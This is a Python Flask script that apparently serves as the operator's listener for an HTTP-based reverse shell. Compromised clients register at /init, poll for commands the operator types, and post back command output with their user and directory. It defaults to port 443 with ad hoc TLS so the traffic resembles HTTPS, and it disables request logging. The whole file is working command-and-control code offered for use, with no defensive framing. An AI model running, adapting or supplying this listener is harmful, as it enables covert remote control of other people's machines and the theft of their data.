#!/usr/bin/env python3

from threading import Thread

from flask import Flask

app = Flask(__name__)

from uuid import uuid1
from flask import jsonify, request

shells_filename = 'shells.txt'

prompt_prefix = ''


def read_stored_shells():
    with open(shells_filename, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines()]


def write_shell(shell_id, remote_addr):
    with open(shells_filename, 'a', encoding='utf-8') as file:
        file.write(shell_id)
        file.write('\n')
        print('New command session opened: {remote_addr} '.format(remote_addr=remote_addr))
        return shell_id


@app.route('/')
@app.route('/index')
def index():
    return "Hello, World!"


def unauthorized():
    response = jsonify({
        'message': 'A winner isn\'t you'
    })
    return response, 401


def forbidden():
    response = jsonify({
        'message': 'What are you doing, are you okay?'
    })
    return response, 403


@app.route('/init')
def init_shell():
    shell_id = write_shell(str(uuid1()), request.remote_addr)
    return jsonify(shell_id)


current_user = ''
current_dir = ''


@app.route('/<shell_id>', methods=["POST", "GET"])
def listen(shell_id):
    if shell_id not in read_stored_shells():
        print("{ip}: {shell_id} doesn't exist".format(ip=request.remote_addr,
                                                      shell_id=shell_id))
        return unauthorized()
    remote_addr = request.remote_addr
    method = request.method
    prompt_prefix = '{remote_addr} >> '.format(remote_addr=remote_addr)
    global current_user
    global current_dir

    if current_user and current_dir:
        prompt_prefix = "{user}@{remote_addr}:{pwd}$ ".format(user=current_user,
                                                              remote_addr=remote_addr,
                                                              pwd=current_dir)
    if method == 'GET':
        if not current_user and not current_dir:
            return jsonify(cmd='echo', cwd='.')
        command = ''
        while command == '':
            command = input(prompt_prefix)
        return jsonify(cmd=command, cwd=current_dir)
    elif method == "POST":
        try:
            data = request.json
            if not data:
                print("{ip}: {shell_id} empty response received".format(ip=request.remote_addr,
                                                                        shell_id=shell_id))
                return forbidden()
            encoding = data['encoding']
            user = data['user']
            pwd = data['pwd']
            current_user = user
            current_dir = pwd
            print("\n{output}".format(output=data['data'].encode(encoding, 'ignore').decode('utf-8',
                                                                                            'ignore')))
        except Exception as e:
            print(e)
            return forbidden()
    return jsonify("ok thanks")


class FlaskThread():
    def __init__(self, app, ip, ssl=False, port=80):
        assert app
        self.app = app
        self.ip = ip
        self.port = port
        self.ssl = ssl
        self.thread = Thread(target=self.run, args=())

    def start(self):
        self.thread.start()

    def run(self):
        if self.ssl:
            self.app.run(host=self.ip, port=self.port, ssl_context='adhoc')
        else:
            self.app.run(host=self.ip, port=self.port)


DEFAULT_IP_BIND_ADDRESS = '0.0.0.0'
DEFAULT_PORT = 443
DEFAULT_SSL_FLAG = True


def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument('--ip',
                        dest='ip',
                        required=False,
                        default=DEFAULT_IP_BIND_ADDRESS,
                        help='IP address of the Flask server to bind to. Default is ' + DEFAULT_IP_BIND_ADDRESS)
    parser.add_argument('--port',
                        dest='port',
                        default=DEFAULT_PORT,
                        required=False,
                        help='Port of the Flask application to bind to. Default is ' + str(DEFAULT_PORT))
    parser.add_argument('--ssl',
                        action='store_true',
                        default=DEFAULT_SSL_FLAG,
                        required=False,
                        help='Switch on HTTPS or not. Default is ' + str(DEFAULT_SSL_FLAG))
    options = parser.parse_args()

    return options


options = get_arguments()

import logging
from time import gmtime, strftime

logging.getLogger('werkzeug').disabled = True


def current_date_time():
    return strftime("%Y-%m-%d %H:%M:%S", gmtime())


def serve_forever():
    while True:
        pass


if __name__ == "__main__":
    flask_thread = FlaskThread(app, ip=options.ip,
                               port=options.port,
                               ssl=options.ssl)
    flask_thread.start()
    print('[{now}] Listening for connections...\r'.format(now=current_date_time()), end='', flush=True)
    serve_forever()
